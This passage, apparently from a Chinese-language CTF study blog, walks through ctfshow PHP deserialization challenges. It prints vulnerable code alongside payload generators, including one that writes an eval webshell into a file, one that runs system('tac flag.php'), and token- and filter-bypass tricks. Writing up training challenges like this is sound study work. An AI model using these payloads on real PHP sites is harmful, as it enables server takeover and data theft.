function_ invoke__">base64_encode</span>(<span class="string">&apos;|&apos;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">feng&#x5E08;&#x5085;&#x7684;&#x4E5F;&#x53EF;&#x4EE5;&#xFF1A;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&quot;10.php&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="string">&apos;&lt;?php eval($_POST[1]);?&gt;&apos;</span>;</span><br><span class="line">    }   </span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">User</span>()));</span><br></pre></td></tr></table></div></figure>

<p>&#x518D;&#x8BD5;&#x8BD5;&#x81EA;&#x5DF1;&#x7684;&#x884C;&#x4E0D;&#x884C;&#xFF1F;&#xFF1F;&#xFF1F;</p>
<p>&#x554A;&#x4E5F;&#x53EF;&#x4EE5;&#xFF1A;</p>
<p>&#x95EE;&#x9898;&#x51FA;&#x5728;&#x521A;&#x5F00;&#x59CB;&#x7684;&#x65F6;&#x5019;&#x6CA1;&#x6709;&#x5199;&#x5165;cookie&#xFF0C;&#x5BFC;&#x81F4;&#x540E;&#x9762;&#x7684;check.php&#x6CA1;&#x6709;&#x6267;&#x884C;</p>
<p>&#x56E0;&#x4E3A;&#x4FEE;&#x6539;cookie&#x5E94;&#x8BE5;&#x662F;&#x5728;index.php&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x91CC;&#x9762;&#x5199;&#x5165;&#xFF0C;&#x5199;&#x597D;&#x4EE5;&#x540E;&#x518D;&#x5728;check.php&#x91CC;&#x9762;&#x5224;&#x65AD;&#xFF0C;&#x8BFB;&#x53D6;cookie&#x7684;&#x503C;&#xFF0C;&#x4E4B;&#x540E;&#x7531;&#x4E8E;inc&#x6587;&#x4EF6;&#x91CC;&#x9762;&#x7684;<code>file_put_content </code>&#x8FD9;&#x4E2A;&#x5371;&#x9669;&#x51FD;&#x6570;&#xFF0C;&#x6240;&#x4EE5;&#x5C31;&#x4F1A;&#x5199;&#x5165;&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&quot;ra.php&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="string">&apos;&lt;?php system(&quot;tac flag.php&quot;)?&gt;&apos;</span>;</span><br><span class="line">    }    </span><br><span class="line">}</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">User</span>()));</span><br></pre></td></tr></table></div></figure>

<p>&#x6211;&#x8FD9;&#x4E2A;&#x4E5F;&#x53EF;&#x4EE5;&#x5199;&#x8FDB;&#x53BB;</p>
<hr>

        <h3 id="264">
          <a href="#264" class="heading-link"><i class="fas fa-link"></i></a><a href="#264" class="headerlink" title="264"></a>264</h3>
      <p>&#x8003;&#x70B9;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x4E32;&#x9003;&#x9038;&#xFF0C;&#x548C;262&#x533A;&#x522B;&#x5728;&#x8981;&#x4ECE;session&#x91CC;&#x9762;&#x5199;</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&apos;user&apos;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&apos;f&apos;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&apos;m&apos;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&apos;t&apos;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>)){</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title class_">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&apos;fuck&apos;</span>, <span class="string">&apos;loveU&apos;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&apos;msg&apos;</span>]=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&apos;Your message has been sent&apos;</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></div></figure>

<p>&#x8981;&#x5403;&#x6389;&#x7684;&#x5B57;&#x7B26;&#x957F;&#x5EA6;&#x662F;27&#xFF0C;&#x6709;fuck&#x6362;loveu&#xFF0C;&#x7136;&#x540E;&#xFF0C;&#x4F20;&#x53C2;&#xFF0C;&#x8BBF;&#x95EE;message.php&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4FEE;&#x6539;cookie&#x4E3A;msg&#x4E3A;admin&#xFF0C;&#x7136;&#x540E;&#x53EF;&#x5F97;flag</p>

        <h3 id="265">
          <a href="#265" class="heading-link"><i class="fas fa-link"></i></a><a href="#265" class="headerlink" title="265"></a>265</h3>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&apos;flag.php&apos;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&apos;ctfshow&apos;</span>]);</span><br><span class="line"><span class="variable">$ctfshow</span>-&gt;token=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;<span class="title function_ invoke__">login</span>()){</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></div></figure>

<p>&#x8BB2;&#x7684;&#x662F;PHP&#x7684;&#x5F15;&#x7528;&#xFF0C;&#x7C7B;&#x4F3C;&#x4E8E;c&#x7684;&#x6307;&#x9488;&#x4F46;&#x53C8;&#x4E0D;&#x4E00;&#x6837;&#xFF0C;</p>
<blockquote>
<p>&#x8FD9;&#x9053;&#x9898;&#x7684;&#x4E3B;&#x8981;&#x77E5;&#x8BC6;&#x70B9;&#xFF1A;&#x5F15;&#x7528;&#x662F;&#x628A;&#x4E00;&#x4E2A;&#x53D8;&#x91CF;&#x7684;&#x5730;&#x5740;&#x7ED9;&#x4E86;&#x53E6;&#x4E00;&#x4E2A;&#x53D8;&#x91CF;&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x6362;&#x4E86;&#x4E00;&#x4E2A;&#x522B;&#x540D;&#xFF0C;&#x5BF9;&#x4E8E;&#x8FD9;&#x9053;&#x9898;&#x6765;&#x8BF4;&#xFF1A;</p>
<p>&#x8981;&#x8BA9;token&#x4E0E;password&#x7684;&#x503C;&#x76F8;&#x540C;&#xFF0C;&#x4F46;&#x662F;&#x4F1A;&#x751F;&#x6210;&#x968F;&#x673A;&#x6570;&#x79CD;&#x5B50;&#xFF0C;&#x5E76;&#x4E0D;&#x77E5;&#x9053;token&#x7684;&#x503C;&#xFF0C;&#x4E5F;&#x5C31;&#x6CA1;&#x6CD5;&#x5728;&#x6784;&#x9020;&#x7684;&#x65F6;&#x5019;&#x76F4;&#x63A5;&#x7ED9;password &#x8D4B;&#x503C;&#xFF1B;&#x7136;&#x800C;&#x901A;&#x8FC7;&#x5F15;&#x7528;&#x5C31;&#x53EF;&#x4EE5;&#x8BA9;token&#x548C;password&#x4F7F;&#x7528;&#x76F8;&#x540C;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x4F7F;token===password&#x6052;&#x6210;&#x7ACB;&#xFF0C;&#x4E5F;&#x5C31;&#x7ED5;&#x8FC7;&#x4E86;token&#x7684;&#x968F;&#x5373;&#x52A0;&#x5BC6;&#x4E86;</p>
</blockquote>
<p>&#x6709;&#x4EE5;&#x4E0B;&#x77E5;&#x8BC6;&#x70B9;&#x8FD8;&#x6CA1;&#x5F04;&#x61C2;&#xFF1A;</p>
<ul>
<li><input disabled type="checkbox"> PHP&#x5F15;&#x7528;&#xFF1A;<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.references.whatare.php">PHP: &#x5F15;&#x7528;&#x662F;&#x4EC0;&#x4E48; - Manual</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
<li><input disabled type="checkbox"> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.references.php">PHP: &#x5BF9;&#x8C61;&#x548C;&#x5F15;&#x7528; - Manual</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
<li><input disabled type="checkbox"> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.variance.php">PHP: &#x534F;&#x53D8;&#x4E0E;&#x9006;&#x53D8; - Manual</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
<li><input disabled type="checkbox"> &#x786C;&#x94FE;&#x63A5;&#x548C;&#x8F6F;&#x94FE;&#x63A5;&#x7684;&#x533A;&#x522B;</li>
</ul>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token =&amp; <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">        </span><br><span class="line">    }    </span><br><span class="line">}</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">ctfshowAdmin</span>());</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>


        <h3 id="266">
          <a href="#266" class="heading-link"><i class="fas fa-link"></i></a><a href="#266" class="headerlink" title="266"></a>266</h3>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&apos;flag.php&apos;</span>);</span><br><span class="line"><span class="variable">$cs</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&apos;php://input&apos;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&apos;xxxxxx&apos;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&apos;xxxxxx&apos;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$ctfshowo</span>=@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cs</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&apos;/ctfshow/&apos;</span>, <span class="variable">$cs</span>)){</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></div></figure>

<p>&#x8981;&#x6C42;&#x7ED5;&#x8FC7;ctfshow&#xFF0C;&#x4F46;&#x662F;&#x53EF;&#x77E5;&#x9664;&#x4E86;&#x53D8;&#x91CF;&#x540D;&#xFF0C;&#x5E38;&#x91CF;&#xFF0C;&#x952E;&#x503C;&#x5BF9;&#x8981;&#x533A;&#x5206;&#x5927;&#x5C0F;&#x5199;&#xFF0C;&#x522B;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x65B9;&#x6CD5;&#xFF0C;&#x7C7B;&#xFF0C;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x6216;&#x8005;NULL&#xFF0C;FALSE,TRUE&#x4E4B;&#x7C7B;&#x7684;&#x90FD;&#x4E0D;&#x533A;&#x5206;&#x5927;&#x5C0F;&#x5199;</p>
<p>&#x8003;&#x70B9;&#xFF1A;&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;&#xFF1B;&#x7834;&#x574F;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x7ED3;&#x6784;&#x4F46;&#x4E0D;&#x7834;&#x574F;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x7C7B;&#x540D;&#xFF08;&#x5F88;&#x62A5;&#x9519;&#xFF0C;&#x4F46;&#x4E0D;&#x5F71;&#x54CD;&#x83B7;&#x53D6;flag&#xFF09;</p>
<p>payload:</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>{</span><br><span class="line">}</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Ctfshow</span>());</span><br></pre></td></tr></table></div></figure>

<p>yu22&#x5E08;&#x5085;&#x8BF4;&#xFF1A;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#xFF0C;&#x5982;&#x679C;&#x629B;&#x51FA;&#x4E86;&#x5F02;&#x5E38;&#x5C31;&#x6CA1;&#x6CD5;&#x6267;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#xFF0C;&#x6240;&#x4EE5;&#x8981;&#x7ED5;&#x8FC7;&#x5F02;&#x5E38;&#xFF0C;&#x7531;&#x4E8E;&#x7C7B;&#x540D;&#x4E0D;&#x533A;&#x5206;&#x5927;&#x5C0F;&#x5199;&#xFF0C;&#x53EA;&#x8981;&#x80FD;&#x4E32;&#x4E00;&#x4E2A;&#x7C7B;&#x5C31;&#x884C;&#xFF0C;&#x5C31;&#x4F1A;&#x6267;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;__destruct&#x51FD;&#x6570;</p>
<p><img src="/2022/07/30/7-30/7-30/1661441783175.png" alt="1661441783175"></p>
<p>&#x8FD9;&#x6837;&#x653E;payload&#x4E5F;&#x53EF;&#x5F97;&#x5230;flag</p>

        <h3 id="267">
          <a href="#267" class="heading-link"><i class="fas fa-link"></i></a><a href="#267" class="headerlink" title="267"></a>267</h3>
      <ul>
<li><input disabled type="checkbox"> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/xuandao_ahfengren/article/details/111259943">Yii2 &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;(CVE-2020-15148)&#x590D;&#x73B0;_&#x950B;&#x5203;&#x79D1;&#x6280;&#x7684;&#x535A;&#x5BA2;-CSDN&#x535A;&#x5BA2;_yii&#x6F0F;&#x6D1E;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
<li><input disabled type="checkbox"> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/113824239"> yii2&#x6846;&#x67B6; &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x590D;&#x73B0;_bfengj&#x7684;&#x535A;&#x5BA2;-CSDN&#x535A;&#x5BA2;_yii&#x6846;&#x67B6;&#x6F0F;&#x6D1E;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
<li><input disabled type="checkbox"> <span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.cnblogs.com/drunkhero/p/namespace.html">PHP&#x547D;&#x4EE4;&#x7A7A;&#x95F4;namespace&#x53CA;use&#x7684;&#x7528;&#x6CD5;&#x5B9E;&#x8DF5;&#x603B;&#x7ED3; - &#x7FDF;&#x7801;&#x519C; - &#x535A;&#x5BA2;&#x56ED; (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></li>
<li><input disabled type="checkbox"> <img src="/2022/07/30/7-30/7-30/1661442535375.png" alt="1661442535375"></li>
</ul>

        <h1 id="PHP&#xFF01;&#xFF01;&#xFF01;&#xFF01;">
          <a href="#PHP&#xFF01;&#xFF01;&#xFF01;&#xFF01;" class="heading-link"><i class="fas fa-link"></i></a><a href="#PHP&#xFF01;&#xFF01;&#xFF01;&#xFF01;" class="headerlink" title="PHP&#xFF01;&#xFF01;&#xFF01;&#xFF01;"></a>PHP&#xFF01;&#xFF01;&#xFF01;&#xFF01;</h1>
      <p>20220804</p>
<ul>
<li>file_get_contents() &#x628A;&#x6574;&#x4E2A;&#x6587;&#x4EF6;&#x8BFB;&#x5165;&#x4E00;&#x4E2A;<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&amp;spm=1001.2101.3001.7020">&#x5B57;&#x7B26;&#x4E32;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>&#x4E2D;&#x3002;</li>
</ul>
<p>20220805</p>
<ul>
<li>php&#x4E2D;&#x7684;assert&#x7C7B;&#x4F3C;&#x4E8E;if&#x8BED;&#x53E5;&#xFF0C;&#x4F46;&#x662F;&#x66F4;&#x52A0;&#x7B80;&#x6D01;&#x4E14;&#x5B98;&#x65B9;&#x5EFA;&#x8BAE;&#x4F7F;&#x7528;assert&#x8BED;&#x53E5;&#x8FDB;&#x884C;&#x7A0B;&#x5E8F;&#x7684;&#x8C03;&#x8BD5;&#xFF08;debug&#x91CC;&#x9762;&#x4F7F;&#x7528;&#xFF0C;&#x662F;&#x4E00;&#x4E2A;&#x5B8F;&#xFF0C;&#x5F53;&#x53D1;&#x5E03;release&#x7248;&#x672C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x53EF;&#x4EE5;&#x7981;&#x7528;&#x5B8F;&#xFF0C;&#x4ECE;&#x800C;&#x7981;&#x7528;assert&#x8BED;&#x53E5;&#xFF09;&#xFF0C;assert&#x80FD;&#x5C06;&#xFF08;&#xFF09;&#x5185;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x8BED;&#x53E5;&#x8BC6;&#x522B;&#x6210;PHP&#x8BED;&#x53E5;&#x5E76;&#x6267;&#x884C;&#xFF0C;&#x82E5;bool&#x4E3A;&#x5047;&#xFF0C;&#x5219;&#x62A5;&#x9519;&#xFF1B;&#x6B63;&#x662F;&#x8FD9;&#x4E00;&#x70B9;&#x548C;eval&#x8BED;&#x53E5;&#x4E0D;&#x540C;&#xFF08;eval&#x8BED;&#x53E5;&#x53EA;&#x4F1A;&#x6267;&#x884C;&#x89C4;&#x8303;&#x7684;PHP&#x8BED;&#x53E5;&#xFF09;</li>
</ul>
<p>20220809</p>
<p>&#x4E22;&#x4E0D;&#x4E22;&#x4EBA;&#xFF0C;&#x51E0;&#x5929;&#x6CA1;&#x5F00;&#x7535;&#x8111;&#x4E86;&#x3002;&#x3002;</p>
<ul>
<li><img src="/2022/07/30/7-30/7-30/1660036245365.png" alt="1660036245365"></li>
</ul>
<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0X04-POP-%E9%93%BE%E7%9A%84%E4%BB%8B%E7%BB%8D">&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#x5E26;&#x4F60;&#x6DF1;&#x5165;&#x7406;&#x89E3;&#x6F0F;&#x6D1E;&#x4E4B; PHP &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E; | K0rz3n&#x2019;s Blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#x91CC;&#x9762;&#x9047;&#x5230;&#x7684;&#x7C7B;&#x548C;&#x7EE7;&#x627F;&#x7684;&#x95EE;&#x9898;&#xFF08;&#x2014;&#x2014;&#x4E0A;&#x9762;&#x8FD9;&#x7BC7;</p>
<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/wz0819529/article/details/120885725?app_version=5.7.0&amp;code=app_1562916241&amp;csdn_share_tail=%7B%22type%22:%22blog%22,%22rType%22:%22article%22,%22rId%22:%22120885725%22,%22source%22:%22Kirsten_Slime%22%7D&amp;ctrtid=a77l7&amp;uLinkId=usr1mkqgl919blen&amp;utm_source=app">(1&#x6761;&#x6D88;&#x606F;) &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5B66;&#x4E60;&#x4E4B;PHP&#x53CD;&#x5E8F;&#x5217;&#x5316;&amp;POP&#x94FE;&#x6784;&#x9020;_sp4c1ous&#x7684;&#x535A;&#x5BA2;-CSDN&#x535A;&#x5BA2;_php&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x94FE;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
